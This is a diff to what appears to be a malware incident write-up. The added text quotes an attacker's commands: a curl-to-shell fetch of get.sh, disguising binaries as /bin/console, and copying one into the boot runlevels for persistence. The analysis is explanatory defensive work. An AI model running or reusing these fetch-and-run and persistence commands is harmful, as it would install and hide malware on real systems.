@@ -107,7 +107,28 @@ rm -f /etc/runlevels/default/console
 exit
 ```
 
-As we can see from the first few commands, the bad actor downloads and extracts a payload from `get.sh` and installs three malicious binaries, `c`, `a`, and `b`. They then use `a`, which they name `/bin/console` to hide it (to make it look like the actual legitimate `/bin/console` binary), and write data to `/etc/apk/macwszvxno`, which appears to be storing malware parameters or something similar. 
+As we can see from the first few commands, the bad actor downloads and extracts a payload from `get.sh` and installs three malicious files, `c`, `a`, and `b`. 
+
+```
+cd /tmp
+curl http://127.0.0.1:10000/a/get.sh | sh
+tar xf t.tar
+cp c /etc/apk/macwszvxno
+cp a /bin/console
+cp b /etc/runlevels/default/console
+```
+
+They then use `a`, which they name `/bin/console` to hide it (to make it look like the some legitimate binary), to write data to `/etc/apk/macwszvxno`, which appears to be storing malware parameters or something similar. 
+
+```
+/bin/console -s -o /etc/apk/macwszvxno
+```
+
+Also, `b` is copied into `/etc/runlevels/default/console` so that it automatically starts at boot. 
+
+```
+cp b /etc/runlevels/default/console
+```
 
 The bad actor then tries to delete all artifacts, as we see in 3 of the last 4 commands:
 
